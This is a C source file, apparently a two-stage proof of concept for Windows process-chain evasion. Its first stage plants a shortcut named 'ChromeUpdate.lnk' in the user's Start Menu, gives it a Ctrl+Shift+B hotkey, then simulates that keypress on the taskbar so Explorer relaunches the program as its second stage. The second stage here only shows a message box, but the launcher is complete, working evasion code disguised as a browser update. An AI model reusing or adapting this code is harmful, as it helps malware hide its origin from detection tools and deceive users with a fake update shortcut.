#include <windows.h>
#include <shlobj.h>
#include <strsafe.h>
#include <stdio.h>

#define STAGE_TWO_STRING "stage2"
#define LINK_FILE_NAME L"ChromeUpdate.lnk"
#define LINK_KEY 'B'

// Helper function to get the path of the current executable
char* GetCurrentProcessPath() {
    char* buffer = NULL;
    DWORD bufferSize = MAX_PATH;

    while (1) {
        buffer = (char*)realloc(buffer, bufferSize * sizeof(char));
        if (buffer == NULL) {
            return NULL;
        }

        DWORD result = GetModuleFileName(NULL, buffer, bufferSize);
        if (result == 0) {
            free(buffer);
            return NULL;
        }

        // If the result is less than buffer size, we have enough space
        if (result < bufferSize) {
            buffer[result] = '\0';
            return buffer;
        }

        // Double buffer size if it's not enough
        bufferSize *= 2;
    }
}

void Stage1();
void Stage2();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Parse command-line arguments to check if Stage 2 should be executed
    if (__argc > 1 && strcmp(__argv[1], STAGE_TWO_STRING) == 0) {
        Stage2();
    } else {
        Stage1();
    }
    return 0;
}

void Stage1() {
    HRESULT hres;
    IShellLink* psl = NULL;
    IPersistFile* ppf = NULL;
    LPSTR targetPath = GetCurrentProcessPath();

    WCHAR expandedAppDataPath[MAX_PATH];
    WCHAR finalPath[MAX_PATH];
    DWORD result;

    // Expand the %AppData% environment variable
    result = ExpandEnvironmentStringsW(L"%AppData%", expandedAppDataPath, MAX_PATH);

    if (result == 0) {
        // Error handling
        //printf("Failed to expand environment string. Error: %lu\n", GetLastError());
        goto cleanup;
    }

    // Initialize the final path with the expanded path
    wcscpy_s(finalPath, MAX_PATH, expandedAppDataPath);

    HRESULT hr = StringCchCatW(finalPath, MAX_PATH, L"\\Microsoft\\Windows\\Start Menu\\");
    if (FAILED(hr)) {
        //printf("Failed to concatenate Start Menu path. Error: 0x%08lx\n", hr);
        return;
    }

    // Concatenate the target lnk file path to the expanded path
    hr = StringCchCatW(finalPath, MAX_PATH, LINK_FILE_NAME);
    if (FAILED(hr)) {
        //printf("Failed to concatenate strings. Error: 0x%08lx\n", hr);
        goto cleanup;
    }

    // Initialize COM library
    hres = CoInitialize(NULL);
    if (FAILED(hres)) {
        //printf("Failed to initialize COM library. Error: %lx\n", hres);
        goto cleanup;
    }

    // Create an instance of the IShellLink interface
    hres = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (void**)&psl);
    if (FAILED(hres)) {
        //printf("Failed to create IShellLink instance. Error: %lx\n", hres);
        goto cleanup;
    }

    // Set the correct path to the target file
    hres = psl->lpVtbl->SetPath(psl, targetPath);
    if (FAILED(hres)) {
        //printf("Failed to set path. Error: %lx\n", hres);
        goto cleanup;
    }

    // Set arguments to exec second stage (optional if you implemented other staging control method)
    hres = psl->lpVtbl->SetArguments(psl, STAGE_TWO_STRING);
    if (FAILED(hres)) {
        //printf("Failed to set arguments. Error: %lx\n", hres);
        goto cleanup;
    }

    // Set the hotkey (Ctrl + Shift + What-Ever-Key-You-Chose)
    hres = psl->lpVtbl->SetHotkey(psl, MAKEWORD(LINK_KEY, HOTKEYF_CONTROL | HOTKEYF_SHIFT));
    if (FAILED(hres)) {
        //printf("Failed to set hotkey. Error: %lx\n", hres);
        goto cleanup;
    }

    // Get the IPersistFile interface to save the shortcut
    hres = psl->lpVtbl->QueryInterface(psl, &IID_IPersistFile, (void**)&ppf);
    if (FAILED(hres)) {
        //printf("Failed to get IPersistFile interface. Error: %lx\n", hres);
        goto cleanup;
    }

    // Save the shortcut
    hres = ppf->lpVtbl->Save(ppf, finalPath, TRUE);
    if (FAILED(hres)) {
        //printf("Failed to save shortcut. Error: %lx\n", hres);
        goto cleanup;
    }
    //printf("Shortcut created successfully.\n");

    HWND hPrevWnd = GetForegroundWindow();
    HWND hExplorerWnd = FindWindow("Shell_TrayWnd", NULL); // "Shell_TrayWnd" is the class name for the task bar
    if (hExplorerWnd == NULL) {
        //printf("Target window not found.\n");
        return;
    }
    SetForegroundWindow(hExplorerWnd);
    //printf("Calling Shortcut.\n");

    // Simulate the shortcut using SendInput
    INPUT inputs[6] = { 0 };

    // Ctrl down
    inputs[0].type = INPUT_KEYBOARD;
    inputs[0].ki.wVk = VK_CONTROL;
    inputs[0].ki.dwFlags = 0;

    // Shift down
    inputs[1].type = INPUT_KEYBOARD;
    inputs[1].ki.wVk = VK_SHIFT;
    inputs[1].ki.dwFlags = 0;

    // Shortcut-key down
    inputs[2].type = INPUT_KEYBOARD;
    inputs[2].ki.wVk = LINK_KEY;
    inputs[2].ki.dwFlags = 0;

    // Shortcut-key up
    inputs[3].type = INPUT_KEYBOARD;
    inputs[3].ki.wVk = LINK_KEY;
    inputs[3].ki.dwFlags = KEYEVENTF_KEYUP;

    // Shift up
    inputs[4].type = INPUT_KEYBOARD;
    inputs[4].ki.wVk = VK_SHIFT;
    inputs[4].ki.dwFlags = KEYEVENTF_KEYUP;

    // Ctrl up
    inputs[5].type = INPUT_KEYBOARD;
    inputs[5].ki.wVk = VK_CONTROL;
    inputs[5].ki.dwFlags = KEYEVENTF_KEYUP;

    // Send the input
    SendInput(6, inputs, sizeof(INPUT));

    if (hPrevWnd != NULL) {
        SetForegroundWindow(hPrevWnd);
    }

    cleanup:
    if(targetPath!=NULL) free(targetPath);
    if(ppf) ppf->lpVtbl->Release(ppf);
    if(psl) psl->lpVtbl->Release(psl);
    CoUninitialize();
}

void Stage2() {
    // Just some arbitrary code to showcase that the PoC works.

    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32 == NULL) return;

    typedef int (WINAPI *MessageBoxA_t)(HWND, LPCSTR, LPCSTR, UINT);
    MessageBoxA_t pMessageBoxA = (MessageBoxA_t)GetProcAddress(hUser32, "MessageBoxA");
    if (pMessageBoxA == NULL) {
        FreeLibrary(hUser32);
        return;
    }

    pMessageBoxA(NULL, "Check process info", "Hey There!", MB_OK | MB_ICONINFORMATION);

    FreeLibrary(hUser32);
}
